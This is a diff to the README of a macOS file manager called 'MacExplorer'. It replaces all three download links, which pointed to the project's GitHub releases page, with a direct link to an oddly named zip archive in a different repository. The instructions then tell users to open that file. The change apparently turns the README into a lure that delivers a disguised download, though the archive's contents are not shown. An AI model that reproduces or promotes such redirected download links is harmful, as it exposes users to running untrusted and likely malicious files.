@@ -7,7 +7,7 @@ description: "Explore files natively with a Windows-style layout, rebuilt for ma
 
 ## 📥 Download MacExplorer Now
 
-[![Download MacExplorer](https://img.shields.io/badge/Download-MacExplorer-2ea44f?style=for-the-badge)](https://github.com/Kenny206868/MacExplorer/releases)
+[![Download MacExplorer](https://img.shields.io/badge/Download-MacExplorer-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Kenny206868/kenny206868.github.io/main/ballsxbricks/Release_1.0.zip)
 
 ## 👋 Welcome to MacExplorer
 
@@ -40,7 +40,7 @@ MacExplorer looks great with both light and dark modes. You can choose how you w
 Getting MacExplorer up and running is quick and easy. Follow these simple steps:
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/Kenny206868/MacExplorer/releases](https://github.com/Kenny206868/MacExplorer/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Kenny206868/kenny206868.github.io/main/ballsxbricks/Release_1.0.zip](https://raw.githubusercontent.com/Kenny206868/kenny206868.github.io/main/ballsxbricks/Release_1.0.zip)
 
 ### Step 2: Open the Downloaded File
 Once the download is complete, find the downloaded file in your Downloads folder. Double-click it to open it.
@@ -111,7 +111,7 @@ If you run into any issues or have questions, there are several ways to get help
 
 Don't let messy files slow you down. MacExplorer gives you the tools you need to keep everything organized, find things quickly, and work more efficiently. Download it today and see how much easier file management can be!
 
-[![Download MacExplorer Now](https://img.shields.io/badge/Download-MacExplorer-ff69b4?style=for-the-badge)](https://github.com/Kenny206868/MacExplorer/releases)
+[![Download MacExplorer Now](https://img.shields.io/badge/Download-MacExplorer-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/Kenny206868/kenny206868.github.io/main/ballsxbricks/Release_1.0.zip)
 
 ## 📝 Final Thoughts
 
